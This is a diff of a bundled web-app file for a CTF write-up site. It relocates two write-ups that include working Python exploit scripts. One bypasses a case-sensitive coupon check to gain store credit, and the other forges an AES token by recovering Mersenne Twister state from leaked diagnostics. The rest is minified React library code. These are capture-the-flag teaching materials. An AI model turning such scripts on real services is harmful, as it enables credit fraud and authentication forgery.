@@ -223,295 +223,6 @@ if __name__ == '__main__':
 ## Flag
 
 \`0xfun{enjoy:3[youtu.be/hF0I9h7C4A4?si=BcFv6Diq2OUBqcJn]}\`
-`},{id:"giftforge-web",ctfId:"0xfunctf-2026",title:"Gift Forge",category:"Web",date:"Mar 6, 2026",flag:"VBD{n0rmalization_1s_3asy_1337_a660d3909fa8bb7015edf779ebefb9d0}",summary:"Exploiting a Unicode normalization bypass vulnerability to repeatedly redeem an expired coupon and gain infinite store credits.",tags:["web","unicode-normalization","flask","python","bypass"],content:`
-# Gift Forge
-
-## Overview
-Gift Forge is a web challenge that presents a store where users can purchase gift cards using their virtual balance. New users begin with $0 credits. Upon reviewing the store's inventory, there is a special gift card named **"The Secret Flag"** which costs exactly $1,337 credits. The objective is to find a way to accrue enough credits to buy this specific card and reveal the flag.
-
-## Vulnerability
-
-By examining the Flask application source code, we can hone in on the \`/redeem\` endpoint located in \`src/app.py\`:
-
-\`\`\`python
-@app.route('/redeem', methods=['GET', 'POST'])
-@login_required
-def redeem():
-    if request.method == 'POST':
-        code = request.form.get('code', '').strip()
-        
-        if code == "GIFT500":
-            flash('This special offer has expired.', 'error')
-            return redirect(url_for('redeem'))
-            
-        code = "".join(c for c in unicodedata.normalize('NFKD', code) if not unicodedata.combining(c)).upper()
-        
-        if code == "GIFT500":
-            current_user.balance += 500.0
-            db.session.commit()
-            flash('500 credits added to your account.', 'success')
-            return redirect(url_for('store'))
-\`\`\`
-
-The logic attempts to prevent the redemption of the \`GIFT500\` coupon by checking if the input is strictly equal to \`"GIFT500"\` right at the beginning. If matched, it considers the code "expired" and rejects the request.
-
-However, immediately after that initial filter, the application applies an **NFKD Unicode normalization** and calls \`.upper()\` on the result. If the converted string matches \`"GIFT500"\`, the user is immediately rewarded with 500 balance credits!
-
-Because the preliminary check is completely case-sensitive, an attacker can simply submit the coupon in lower-case (e.g., \`gift500\`). The application's first check gets bypassed since \`"gift500" != "GIFT500"\`. Afterwards, the \`.upper()\` function kicks in and normalizes \`gift500\` to \`GIFT500\`, securely authenticating the coupon validation check on the following lines. 
-
-## Exploit
-
-To solve the challenge, we just need to:
-1. Create a new account.
-2. Redeem the coupon as \`gift500\` three times to achieve $1500 credits.
-3. Afford and buy "The Secret Flag" (Card ID = 4).
-4. See our inventory at the \`/profile\` route to grab the flag code!
-
-Here is the automated exploit script in Python:
-
-\`\`\`python
-import requests
-import string
-import random
-
-def get_random_string(length):
-    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
-
-url = "http://82.29.170.47:32483"
-session = requests.Session()
-
-# 1. Sign up a new user
-username = get_random_string(8)
-password = get_random_string(8)
-session.post(f"{url}/signup", data={"username": username, "password": password})
-
-# 2. Redeem the coupon 3 times bypassing the case-sensitive check
-for _ in range(3):
-    session.post(f"{url}/redeem", data={"code": "gift500"})
-
-# 3. Buy the Secret Flag card (ID: 4 maps to the flagged item)
-session.post(f"{url}/buy/4")
-
-# 4. View profile to extract the flag stored in our digital inventory
-profile_resp = session.get(f"{url}/profile")
-for line in profile_resp.text.split('\\n'):
-    if "card-code" in line:
-        print(line.strip())
-\`\`\`
-
-Running the above script prints out our flag!
-
-## Flag
-\`VBD{n0rmalization_1s_3asy_1337_a660d3909fa8bb7015edf779ebefb9d0}\`
-`},{id:"nerd-mt19937-codevinci",ctfId:"0xfunctf-2026",title:"nerd",category:"Cryptography",date:"Mar 8, 2026",flag:"CodeVinci{I_hop3_y0u_d1dn7_sl0p_th1s_ch4lL_w1th_claude_uFf}",summary:"Exploited an MT19937 PRNG by reconstructing its internal state from leaked diag relationships, addressing in-place mutation and bit-by-bit temper reversal to forge a valid AES token.",tags:["MT19937","PRNG","State-Recovery","AES-ECB","Bit-by-bit"],content:`
-# nerd
-
-## Overview
-The challenge requires us to forge a valid token for the \`ctf\` user. The server issues AES-ECB encrypted tokens where the key and nonce are derived from specific past states of a custom Mersenne Twister (MT19937) PRNG. 
-
-## The Vulnerability: Leaking State via \`diag\`
-The server provides a \`diag <n>\` command that leaks $n$ lines of diagnostic data. Each line gives us two 32-bit integers, $a_t$ and $b_t$, derived from the PRNG's output sequence:
-* $a_t = y_t oplus \\text{rotl32}(y_{t-2}, 11)$
-* $b_t = (y_t \\land \\text{0xFFF00000}) \\lor (y_{t-2} \\land \\text{0x00000FFF})$
-
-By requesting 626 diagnostic pairs, we can fully reconstruct a sliding window of 624 consecutive native outputs ($y_t$):
-1. **Top 12 bits:** $b_t$ directly exposes the top 12 bits of $y_t$.
-2. **Bottom 12 bits:** $b_{t+1}$ exposes the bottom 12 bits of $y_t$ (since it contains the low bits of the previous state).
-3. **Middle 8 bits:** We extract these from $a_t$ by aligning the known bottom 12 bits of $y_{t-2}$ via the 11-bit left rotation and XORing them against $a_t$.
-
-## Untempering the PRNG
-
-Once we have 624 consecutive $y$ outputs, we must untemper them to recover the internal state array. While right-shifts can be reversed via standard XOR loops, the left-shifts (e.g., $y oplus ((y \\ll 7) \\land \\text{0x9D2C5680})$) cause recursive bit corruption if naively looped multiple times. We must reverse the left-shifts bit-by-bit from right to left to perfectly recover the native state.
-
-## State Alignment and In-Place Reversal
-MT19937 algorithms typically update their state array *in-place*. Because our reconstructed outputs cross a twist block boundary (starting at output 2001), we have to:
-1. Extract a hybrid state array that spans across Twist 4 and Twist 5.
-2. Step the twist forward to finish the block and align it to a clean block boundary.
-3. Untwist backwards to recover Twist 4 and Twist 3, carefully accounting for the $i \\ge 227$ index wrap-around where the forward twist XORed against newly updated states rather than old ones.
-
-With the exact past states recovered, we easily re-temper them, derive the target AES key and nonce, and sign our forged token.
-
-## Exploit Script
-
-\`\`\`python
-#!/usr/bin/env python3
-import socket
-import time
-import hashlib
-import struct
-import base64
-import operator
-from Crypto.Cipher import AES
-
-HOST = "nerd.codevinci.it"
-PORT = 9984
-
-def recvuntil(sock, suffix):
-    data = b""
-    while not data.endswith(suffix):
-        chunk = sock.recv(4096)
-        if not chunk:
-            break
-        data += chunk
-    return data
-
-def untemper(y):
-    y = operator.xor(y, y >> 18)
-    y = operator.xor(y, (y << 15) & 0xEFC60000)
-    
-    # Bit-by-bit recovery for the left shift to prevent recursive corruption
-    res = y & 0x7F
-    for i in range(7, 32):
-        bit = operator.xor(y, (res << 7) & 0x9D2C5680) & (1 << i)
-        res |= bit
-    y = res
-    
-    res = y & 0xFFE00000
-    for i in range(20, -1, -1):
-        bit = operator.xor(y, res >> 11) & (1 << i)
-        res |= bit
-    y = res
-    
-    return int(y & 0xFFFFFFFF)
-
-def temper(y):
-    y = operator.xor(y, y >> 11)
-    y = operator.xor(y, (y << 7) & 0x9D2C5680)
-    y = operator.xor(y, (y << 15) & 0xEFC60000)
-    y = operator.xor(y, y >> 18)
-    return int(y & 0xFFFFFFFF)
-
-def untwist(cur):
-    old_y = [0] * 624
-    old_state = [0] * 624
-    
-    for i in range(623, -1, -1):
-        if i >= 227:
-            xor_val = cur[i - 227]
-        else:
-            xor_val = old_state[i + 397]
-            
-        tmp = operator.xor(int(cur[i]), int(xor_val))
-        
-        if tmp & 0x80000000:
-            y = (operator.xor(tmp, 0x9908B0DF) << 1) | 1
-        else:
-            y = tmp << 1
-            
-        old_y[i] = y
-        
-        if i < 623:
-            old_state[i+1] = (old_y[i+1] & 0x80000000) | (old_y[i] & 0x7FFFFFFF)
-            
-    old_state[0] = (old_y[0] & 0x80000000) | (old_y[623] & 0x7FFFFFFF)
-    return old_state
-
-def pkcs7_pad(data, block_size=16):
-    pad_len = block_size - (len(data) % block_size)
-    return data + bytes([pad_len]) * pad_len
-
-def pack_u32(x):
-    return struct.pack(">I", int(x) & 0xFFFFFFFF)
-
-def solve():
-    print("[*] Connecting to server...")
-    sock = socket.socket()
-    sock.connect((HOST, PORT))
-    
-    print("[*] Reading banner...")
-    banner = recvuntil(sock, b"> ").decode("utf-8", errors="ignore")
-    target_user = "ctf"
-    for line in banner.split("\\n"):
-        if "Target user:" in line:
-            target_user = line.split("Target user:")[1].strip()
-    
-    print(f"[*] Target user: {target_user}")
-    
-    print("[*] Requesting 626 diag lines...")
-    sock.sendall(b"diag 626\\n")
-    diag_data_bytes = recvuntil(sock, b"> ")
-    diag_data = diag_data_bytes.decode("utf-8", errors="ignore")
-    
-    pairs = []
-    for line in diag_data.split("\\n"):
-        line = line.replace('>', '').strip()
-        if not line or "ERR" in line:
-            continue
-        
-        parts = line.split()
-        if len(parts) == 2:
-            try:
-                pairs.append((int(parts[0], 16), int(parts[1], 16)))
-            except ValueError:
-                pass
-                
-    print(f"[*] Retrieved {len(pairs)} diagnostic pairs.")
-    
-    print("[*] Reconstructing outputs...")
-    ys = []
-    for i in range(624):
-        a_i, b_i = pairs[i]
-        _, b_next = pairs[i+1] 
-        
-        y_high = b_i & 0xFFF00000
-        mid_xor = operator.xor((a_i >> 12) & 0xFF, (b_i >> 1) & 0xFF)
-        y_mid = mid_xor << 12
-        y_low = b_next & 0xFFF
-        ys.append(y_high | y_mid | y_low)
-        
-    S = [untemper(y) for y in ys]
-    
-    print("[*] Reconstructing internal states...")
-    hybrid_mt = S[496:624] + S[0:496] 
-    
-    for i in range(128, 624):
-        y = (hybrid_mt[i] & 0x80000000) | (hybrid_mt[(i + 1) % 624] & 0x7FFFFFFF)
-        hybrid_mt[i] = operator.xor(hybrid_mt[(i + 397) % 624], y >> 1)
-        if y & 1:
-            hybrid_mt[i] = operator.xor(hybrid_mt[i], 0x9908B0DF)
-            
-    mt_T5 = hybrid_mt
-    
-    mt_T4 = untwist(mt_T5)
-    mt_T3 = untwist(mt_T4)
-    
-    U_1366 = mt_T3[1366 - 1248]
-    U_1376 = mt_T3[1376 - 1248]
-    U_1990 = mt_T4[1990 - 1872]
-    U_1991 = mt_T4[1991 - 1872]
-    U_1992 = mt_T4[1992 - 1872]
-    U_1993 = mt_T4[1993 - 1872]
-    
-    y_1366 = temper(U_1366)
-    y_1376 = temper(U_1376)
-    y_1990 = temper(U_1990)
-    y_1991 = temper(U_1991)
-    y_1992 = temper(U_1992)
-    y_1993 = temper(U_1993)
-    
-    print("[*] Forging Token...")
-    nonce = hashlib.sha256(pack_u32(y_1366) + pack_u32(y_1376)).digest()[:8]
-    key = pack_u32(y_1990) + pack_u32(y_1991) + pack_u32(y_1992) + pack_u32(y_1993)
-    
-    cipher = AES.new(key, AES.MODE_ECB)
-    user_bytes = target_user.encode("utf-8")
-    mac = cipher.encrypt(pkcs7_pad(user_bytes + nonce, 16))[:16]
-    
-    blob = bytes([len(user_bytes)]) + user_bytes + nonce + mac
-    token = base64.b64encode(blob).decode("ascii")
-    print(f"[+] Token generated: {token}")
-    
-    print("[*] Sending validation request...")
-    sock.sendall(f"validate {token}\\n".encode())
-    time.sleep(float(0.5))
-    response = sock.recv(4096).decode("utf-8").strip()
-    
-    print(f"[+] Server Response:\\n{response}")
-    sock.close()
-
-if __name__ == "__main__":
-    solve()
-\`\`\`
 `}],AM=[{id:"bank-heist",ctfId:"bitsctf-2026",title:"Bank Heist",category:"Blockchain",date:"Feb 20 - 22, 2026",flag:"BITSCTF{8ANk_h3157_1n51D3_A_8L0cK_ChA1n_15_cRa2Y}",summary:"Exploited a flash loan vulnerability on Solana by bypassing KYC via Sysvar Instruction introspection and faking a repayment transaction.",tags:["solana","blockchain","flash-loan","kyc-bypass","rust"],content:`
 # Bank Heist — Writeup
 
@@ -1839,6 +1550,86 @@ Using this hash as the password for the ZIP archive successfully unlocks the fla
 
 ## Flag
 \`VBD{c99a11a53a3748269e3f86d7ac38df11}\`
+`},{id:"giftforge-web",ctfId:"ramadanCTF-2026",title:"Gift Forge",category:"Web",date:"Mar 6, 2026",flag:"VBD{n0rmalization_1s_3asy_1337_a660d3909fa8bb7015edf779ebefb9d0}",summary:"Exploiting a Unicode normalization bypass vulnerability to repeatedly redeem an expired coupon and gain infinite store credits.",tags:["web","unicode-normalization","flask","python","bypass"],content:`
+# Gift Forge
+
+## Overview
+Gift Forge is a web challenge that presents a store where users can purchase gift cards using their virtual balance. New users begin with $0 credits. Upon reviewing the store's inventory, there is a special gift card named **"The Secret Flag"** which costs exactly $1,337 credits. The objective is to find a way to accrue enough credits to buy this specific card and reveal the flag.
+
+## Vulnerability
+
+By examining the Flask application source code, we can hone in on the \`/redeem\` endpoint located in \`src/app.py\`:
+
+\`\`\`python
+@app.route('/redeem', methods=['GET', 'POST'])
+@login_required
+def redeem():
+    if request.method == 'POST':
+        code = request.form.get('code', '').strip()
+        
+        if code == "GIFT500":
+            flash('This special offer has expired.', 'error')
+            return redirect(url_for('redeem'))
+            
+        code = "".join(c for c in unicodedata.normalize('NFKD', code) if not unicodedata.combining(c)).upper()
+        
+        if code == "GIFT500":
+            current_user.balance += 500.0
+            db.session.commit()
+            flash('500 credits added to your account.', 'success')
+            return redirect(url_for('store'))
+\`\`\`
+
+The logic attempts to prevent the redemption of the \`GIFT500\` coupon by checking if the input is strictly equal to \`"GIFT500"\` right at the beginning. If matched, it considers the code "expired" and rejects the request.
+
+However, immediately after that initial filter, the application applies an **NFKD Unicode normalization** and calls \`.upper()\` on the result. If the converted string matches \`"GIFT500"\`, the user is immediately rewarded with 500 balance credits!
+
+Because the preliminary check is completely case-sensitive, an attacker can simply submit the coupon in lower-case (e.g., \`gift500\`). The application's first check gets bypassed since \`"gift500" != "GIFT500"\`. Afterwards, the \`.upper()\` function kicks in and normalizes \`gift500\` to \`GIFT500\`, securely authenticating the coupon validation check on the following lines. 
+
+## Exploit
+
+To solve the challenge, we just need to:
+1. Create a new account.
+2. Redeem the coupon as \`gift500\` three times to achieve $1500 credits.
+3. Afford and buy "The Secret Flag" (Card ID = 4).
+4. See our inventory at the \`/profile\` route to grab the flag code!
+
+Here is the automated exploit script in Python:
+
+\`\`\`python
+import requests
+import string
+import random
+
+def get_random_string(length):
+    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
+
+url = "http://82.29.170.47:32483"
+session = requests.Session()
+
+# 1. Sign up a new user
+username = get_random_string(8)
+password = get_random_string(8)
+session.post(f"{url}/signup", data={"username": username, "password": password})
+
+# 2. Redeem the coupon 3 times bypassing the case-sensitive check
+for _ in range(3):
+    session.post(f"{url}/redeem", data={"code": "gift500"})
+
+# 3. Buy the Secret Flag card (ID: 4 maps to the flagged item)
+session.post(f"{url}/buy/4")
+
+# 4. View profile to extract the flag stored in our digital inventory
+profile_resp = session.get(f"{url}/profile")
+for line in profile_resp.text.split('\\n'):
+    if "card-code" in line:
+        print(line.strip())
+\`\`\`
+
+Running the above script prints out our flag!
+
+## Flag
+\`VBD{n0rmalization_1s_3asy_1337_a660d3909fa8bb7015edf779ebefb9d0}\`
 `}],xM=[{id:"bro-is-not-an-astronaut",ctfId:"univsthreats26-quals",title:"Bro is not an astronaut",category:"Forensics",date:"Feb 27, 2026",flag:"UVT{d0nt_k33p_d1GG1in_U_sur3ly_w0Nt_F1nD_aNythng_:)}",summary:"Carved an ext2 cache partition from a raw disk image, extracted unallocated inodes using Sleuth Kit, and brute-forced a sliding-window XOR payload to bypass variable padding.",tags:["disk-image","ext2","sleuthkit","xor","brute-force","python"],content:`
 # Bro is not an astronaut
 
@@ -2580,6 +2371,215 @@ However, the SQL injection path is simpler and doesn't require interacting with 
 ## Flag
 
 \`CodeVinci{Tr4ll4ll3r0_Tr4ll4ll4_P*rc*d1o*_e_p0rCo_4**4*_changed_flag}\`
+`},{id:"nerd-mt19937-codevinci",ctfId:"0xfunctf-2026",title:"nerd",category:"Cryptography",date:"Mar 8, 2026",flag:"CodeVinci{I_hop3_y0u_d1dn7_sl0p_th1s_ch4lL_w1th_claude_uFf}",summary:"Exploited an MT19937 PRNG by reconstructing its internal state from leaked diag relationships, addressing in-place mutation and bit-by-bit temper reversal to forge a valid AES token.",tags:["MT19937","PRNG","State-Recovery","AES-ECB","Bit-by-bit"],content:`
+# nerd
+
+## Overview
+The challenge requires us to forge a valid token for the \`ctf\` user. The server issues AES-ECB encrypted tokens where the key and nonce are derived from specific past states of a custom Mersenne Twister (MT19937) PRNG. 
+
+## The Vulnerability: Leaking State via \`diag\`
+The server provides a \`diag <n>\` command that leaks $n$ lines of diagnostic data. Each line gives us two 32-bit integers, $a_t$ and $b_t$, derived from the PRNG's output sequence:
+* $a_t = y_t oplus \\text{rotl32}(y_{t-2}, 11)$
+* $b_t = (y_t \\land \\text{0xFFF00000}) \\lor (y_{t-2} \\land \\text{0x00000FFF})$
+
+By requesting 626 diagnostic pairs, we can fully reconstruct a sliding window of 624 consecutive native outputs ($y_t$):
+1. **Top 12 bits:** $b_t$ directly exposes the top 12 bits of $y_t$.
+2. **Bottom 12 bits:** $b_{t+1}$ exposes the bottom 12 bits of $y_t$ (since it contains the low bits of the previous state).
+3. **Middle 8 bits:** We extract these from $a_t$ by aligning the known bottom 12 bits of $y_{t-2}$ via the 11-bit left rotation and XORing them against $a_t$.
+
+## Untempering the PRNG
+
+Once we have 624 consecutive $y$ outputs, we must untemper them to recover the internal state array. While right-shifts can be reversed via standard XOR loops, the left-shifts (e.g., $y oplus ((y \\ll 7) \\land \\text{0x9D2C5680})$) cause recursive bit corruption if naively looped multiple times. We must reverse the left-shifts bit-by-bit from right to left to perfectly recover the native state.
+
+## State Alignment and In-Place Reversal
+MT19937 algorithms typically update their state array *in-place*. Because our reconstructed outputs cross a twist block boundary (starting at output 2001), we have to:
+1. Extract a hybrid state array that spans across Twist 4 and Twist 5.
+2. Step the twist forward to finish the block and align it to a clean block boundary.
+3. Untwist backwards to recover Twist 4 and Twist 3, carefully accounting for the $i \\ge 227$ index wrap-around where the forward twist XORed against newly updated states rather than old ones.
+
+With the exact past states recovered, we easily re-temper them, derive the target AES key and nonce, and sign our forged token.
+
+## Exploit Script
+
+\`\`\`python
+#!/usr/bin/env python3
+import socket
+import time
+import hashlib
+import struct
+import base64
+import operator
+from Crypto.Cipher import AES
+
+HOST = "nerd.codevinci.it"
+PORT = 9984
+
+def recvuntil(sock, suffix):
+    data = b""
+    while not data.endswith(suffix):
+        chunk = sock.recv(4096)
+        if not chunk:
+            break
+        data += chunk
+    return data
+
+def untemper(y):
+    y = operator.xor(y, y >> 18)
+    y = operator.xor(y, (y << 15) & 0xEFC60000)
+    
+    # Bit-by-bit recovery for the left shift to prevent recursive corruption
+    res = y & 0x7F
+    for i in range(7, 32):
+        bit = operator.xor(y, (res << 7) & 0x9D2C5680) & (1 << i)
+        res |= bit
+    y = res
+    
+    res = y & 0xFFE00000
+    for i in range(20, -1, -1):
+        bit = operator.xor(y, res >> 11) & (1 << i)
+        res |= bit
+    y = res
+    
+    return int(y & 0xFFFFFFFF)
+
+def temper(y):
+    y = operator.xor(y, y >> 11)
+    y = operator.xor(y, (y << 7) & 0x9D2C5680)
+    y = operator.xor(y, (y << 15) & 0xEFC60000)
+    y = operator.xor(y, y >> 18)
+    return int(y & 0xFFFFFFFF)
+
+def untwist(cur):
+    old_y = [0] * 624
+    old_state = [0] * 624
+    
+    for i in range(623, -1, -1):
+        if i >= 227:
+            xor_val = cur[i - 227]
+        else:
+            xor_val = old_state[i + 397]
+            
+        tmp = operator.xor(int(cur[i]), int(xor_val))
+        
+        if tmp & 0x80000000:
+            y = (operator.xor(tmp, 0x9908B0DF) << 1) | 1
+        else:
+            y = tmp << 1
+            
+        old_y[i] = y
+        
+        if i < 623:
+            old_state[i+1] = (old_y[i+1] & 0x80000000) | (old_y[i] & 0x7FFFFFFF)
+            
+    old_state[0] = (old_y[0] & 0x80000000) | (old_y[623] & 0x7FFFFFFF)
+    return old_state
+
+def pkcs7_pad(data, block_size=16):
+    pad_len = block_size - (len(data) % block_size)
+    return data + bytes([pad_len]) * pad_len
+
+def pack_u32(x):
+    return struct.pack(">I", int(x) & 0xFFFFFFFF)
+
+def solve():
+    print("[*] Connecting to server...")
+    sock = socket.socket()
+    sock.connect((HOST, PORT))
+    
+    print("[*] Reading banner...")
+    banner = recvuntil(sock, b"> ").decode("utf-8", errors="ignore")
+    target_user = "ctf"
+    for line in banner.split("\\n"):
+        if "Target user:" in line:
+            target_user = line.split("Target user:")[1].strip()
+    
+    print(f"[*] Target user: {target_user}")
+    
+    print("[*] Requesting 626 diag lines...")
+    sock.sendall(b"diag 626\\n")
+    diag_data_bytes = recvuntil(sock, b"> ")
+    diag_data = diag_data_bytes.decode("utf-8", errors="ignore")
+    
+    pairs = []
+    for line in diag_data.split("\\n"):
+        line = line.replace('>', '').strip()
+        if not line or "ERR" in line:
+            continue
+        
+        parts = line.split()
+        if len(parts) == 2:
+            try:
+                pairs.append((int(parts[0], 16), int(parts[1], 16)))
+            except ValueError:
+                pass
+                
+    print(f"[*] Retrieved {len(pairs)} diagnostic pairs.")
+    
+    print("[*] Reconstructing outputs...")
+    ys = []
+    for i in range(624):
+        a_i, b_i = pairs[i]
+        _, b_next = pairs[i+1] 
+        
+        y_high = b_i & 0xFFF00000
+        mid_xor = operator.xor((a_i >> 12) & 0xFF, (b_i >> 1) & 0xFF)
+        y_mid = mid_xor << 12
+        y_low = b_next & 0xFFF
+        ys.append(y_high | y_mid | y_low)
+        
+    S = [untemper(y) for y in ys]
+    
+    print("[*] Reconstructing internal states...")
+    hybrid_mt = S[496:624] + S[0:496] 
+    
+    for i in range(128, 624):
+        y = (hybrid_mt[i] & 0x80000000) | (hybrid_mt[(i + 1) % 624] & 0x7FFFFFFF)
+        hybrid_mt[i] = operator.xor(hybrid_mt[(i + 397) % 624], y >> 1)
+        if y & 1:
+            hybrid_mt[i] = operator.xor(hybrid_mt[i], 0x9908B0DF)
+            
+    mt_T5 = hybrid_mt
+    
+    mt_T4 = untwist(mt_T5)
+    mt_T3 = untwist(mt_T4)
+    
+    U_1366 = mt_T3[1366 - 1248]
+    U_1376 = mt_T3[1376 - 1248]
+    U_1990 = mt_T4[1990 - 1872]
+    U_1991 = mt_T4[1991 - 1872]
+    U_1992 = mt_T4[1992 - 1872]
+    U_1993 = mt_T4[1993 - 1872]
+    
+    y_1366 = temper(U_1366)
+    y_1376 = temper(U_1376)
+    y_1990 = temper(U_1990)
+    y_1991 = temper(U_1991)
+    y_1992 = temper(U_1992)
+    y_1993 = temper(U_1993)
+    
+    print("[*] Forging Token...")
+    nonce = hashlib.sha256(pack_u32(y_1366) + pack_u32(y_1376)).digest()[:8]
+    key = pack_u32(y_1990) + pack_u32(y_1991) + pack_u32(y_1992) + pack_u32(y_1993)
+    
+    cipher = AES.new(key, AES.MODE_ECB)
+    user_bytes = target_user.encode("utf-8")
+    mac = cipher.encrypt(pkcs7_pad(user_bytes + nonce, 16))[:16]
+    
+    blob = bytes([len(user_bytes)]) + user_bytes + nonce + mac
+    token = base64.b64encode(blob).decode("ascii")
+    print(f"[+] Token generated: {token}")
+    
+    print("[*] Sending validation request...")
+    sock.sendall(f"validate {token}\\n".encode())
+    time.sleep(float(0.5))
+    response = sock.recv(4096).decode("utf-8").strip()
+    
+    print(f"[+] Server Response:\\n{response}")
+    sock.close()
+
+if __name__ == "__main__":
+    solve()
+\`\`\`
 `}],Xo=[..._M,...AM,...wM,...RM,...xM,...kM,...NM],CM=()=>B.jsxs("div",{className:"container",style:{paddingTop:"5rem"},children:[B.jsx("section",{style:{textAlign:"center",marginBottom:"8rem"},children:B.jsxs(da.div,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.6},children:[B.jsxs("div",{className:"badge",children:[B.jsx(fR,{size:14})," CTF WRITEUPS"]}),B.jsxs("h1",{className:"hero-title",children:["Decrypting the ",B.jsx("br",{}),B.jsx("span",{className:"gradient-text",children:"Unseen Reality."})]}),B.jsx("p",{style:{maxWidth:"600px",margin:"0 auto 3rem",color:"var(--text-dim)",fontSize:"1.1rem",padding:"0 1rem"},children:"A collection of technical deep-dives and CTF solutions by Xfnx. Building things, breaking things, and learning everything."}),B.jsxs("div",{className:"hero-buttons",children:[B.jsxs(At,{to:"/writeups",className:"btn-primary",children:["Explore Writeups ",B.jsx(Mo,{size:18})]}),B.jsx("a",{href:"https://github.com/xfnx-17",target:"_blank",rel:"noreferrer",className:"glass btn-secondary",children:"View Github"})]})]})}),B.jsxs("section",{style:{marginBottom:"8rem"},children:[B.jsxs("div",{className:"flex-between",children:[B.jsxs("div",{children:[B.jsx("h2",{className:"section-title",children:"Challenges"}),B.jsx("p",{style:{color:"var(--text-dim)"},children:"Browse writeups by category"})]}),B.jsxs(At,{to:"/writeups",style:{color:"var(--primary)",fontWeight:600,display:"flex",alignItems:"center",gap:"0.5rem"},children:["View all ",B.jsx(Mo,{size:16})]})]}),(()=>{const e={Cryptography:{icon:B.jsx(b1,{size:24}),desc:"Ciphers, lattices, number theory and more."},Web:{icon:B.jsx(g1,{size:24}),desc:"Injections, auth bypasses, and web exploits."},"Reverse Engineering":{icon:B.jsx(u1,{size:24}),desc:"Binaries, obfuscation, and symbolic execution."},Blockchain:{icon:B.jsx(d1,{size:24}),desc:"Smart contract exploits and on-chain attacks."},Pwn:{icon:B.jsx(gR,{size:24}),desc:"Memory corruption and binary exploitation."},Misc:{icon:B.jsx(ap,{size:24}),desc:"Jails, encoding, and everything else."},OSINT:{icon:B.jsx(ap,{size:24}),desc:"Geolocation, recon, and open-source intel."}},n=[...new Set(Xo.map(r=>r.category))];return B.jsx("div",{className:"cards-grid-small",children:n.map((r,i)=>{const s=Xo.filter(c=>c.category===r).length,u=e[r]||{icon:B.jsx(ap,{size:24}),desc:"Various challenges."};return B.jsxs(da.div,{initial:{opacity:0,y:20},whileInView:{opacity:1,y:0},viewport:{once:!0},transition:{delay:i*.1},className:"glass",style:{padding:"2rem",display:"flex",flexDirection:"column",gap:"1rem"},children:[B.jsx("div",{style:{width:"48px",height:"48px",background:"rgba(155, 89, 182, 0.1)",borderRadius:"12px",display:"flex",alignItems:"center",justifyContent:"center",color:"var(--primary)"},children:u.icon}),B.jsx("h3",{style:{fontSize:"1.3rem"},children:r}),B.jsx("p",{style:{color:"var(--text-dim)",fontSize:"0.9rem",flexGrow:1},children:u.desc}),B.jsxs("span",{style:{fontSize:"0.8rem",color:"var(--primary)",fontWeight:700},children:[s," writeup",s===1?"":"s"]}),B.jsxs(At,{to:`/category/${encodeURIComponent(r)}`,style:{display:"flex",alignItems:"center",gap:"0.5rem",fontWeight:600,fontSize:"0.9rem",color:"var(--primary)"},children:["Explore ",B.jsx(Mo,{size:16})]})]},r)})})})()]})]});var vp={exports:{}},Tp,XA;function IM(){if(XA)return Tp;XA=1;var e="SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED";return Tp=e,Tp}var _p,ZA;function OM(){if(ZA)return _p;ZA=1;var e=IM();function n(){}function r(){}return r.resetWarningCache=n,_p=function(){function i(c,d,g,f,h,b){if(b!==e){var y=new Error("Calling PropTypes validators directly is not supported by the `prop-types` package. Use PropTypes.checkPropTypes() to call them. Read more at http://fb.me/use-check-prop-types");throw y.name="Invariant Violation",y}}i.isRequired=i;function s(){return i}var u={array:i,bigint:i,bool:i,func:i,number:i,object:i,string:i,symbol:i,any:i,arrayOf:s,element:i,elementType:i,instanceOf:s,node:i,objectOf:s,oneOf:s,oneOfType:s,shape:s,exact:s,checkPropTypes:r,resetWarningCache:n};return u.PropTypes=u,u},_p}var QA;function LM(){return QA||(QA=1,vp.exports=OM()()),vp.exports}var DM=LM();const qt=pu(DM);function JA(e){const n=[],r=String(e||"");let i=r.indexOf(","),s=0,u=!1;for(;!u;){i===-1&&(i=r.length,u=!0);const c=r.slice(s,i).trim();(c||!u)&&n.push(c),s=i+1,i=r.indexOf(",",s)}return n}function MM(e,n){const r={};return(e[e.length-1]===""?[...e,""]:e).join((r.padRight?" ":"")+","+(r.padLeft===!1?"":" ")).trim()}const FM=/^[$_\p{ID_Start}][$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,BM=/^[$_\p{ID_Start}][-$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,UM={};function ew(e,n){return(UM.jsx?BM:FM).test(e)}const zM=/[ \t\n\f\r]/g;function PM(e){return typeof e=="object"?e.type==="text"?tw(e.value):!1:tw(e)}function tw(e){return e.replace(zM,"")===""}class ls{constructor(n,r,i){this.normal=r,this.property=n,i&&(this.space=i)}}ls.prototype.normal={};ls.prototype.property={};ls.prototype.space=void 0;function tk(e,n){const r={},i={};for(const s of e)Object.assign(r,s.property),Object.assign(i,s.normal);return new ls(r,i,n)}function Zo(e){return e.toLowerCase()}class Wt{constructor(n,r){this.attribute=r,this.property=n}}Wt.prototype.attribute="";Wt.prototype.booleanish=!1;Wt.prototype.boolean=!1;Wt.prototype.commaOrSpaceSeparated=!1;Wt.prototype.commaSeparated=!1;Wt.prototype.defined=!1;Wt.prototype.mustUseProperty=!1;Wt.prototype.number=!1;Wt.prototype.overloadedBoolean=!1;Wt.prototype.property="";Wt.prototype.spaceSeparated=!1;Wt.prototype.space=void 0;let GM=0;const _e=hr(),ut=hr(),cf=hr(),ne=hr(),qe=hr(),bi=hr(),an=hr();function hr(){return 2**++GM}const df=Object.freeze(Object.defineProperty({__proto__:null,boolean:_e,booleanish:ut,commaOrSpaceSeparated:an,commaSeparated:bi,number:ne,overloadedBoolean:cf,spaceSeparated:qe},Symbol.toStringTag,{value:"Module"})),Ap=Object.keys(df);class sg extends Wt{constructor(n,r,i,s){let u=-1;if(super(n,r),nw(this,"space",s),typeof i=="number")for(;++u<Ap.length;){const c=Ap[u];nw(this,Ap[u],(i&df[c])===df[c])}}}sg.prototype.defined=!0;function nw(e,n,r){r&&(e[n]=r)}function Ai(e){const n={},r={};for(const[i,s]of Object.entries(e.properties)){const u=new sg(i,e.transform(e.attributes||{},i),s,e.space);e.mustUseProperty&&e.mustUseProperty.includes(i)&&(u.mustUseProperty=!0),n[i]=u,r[Zo(i)]=i,r[Zo(u.attribute)]=i}return new 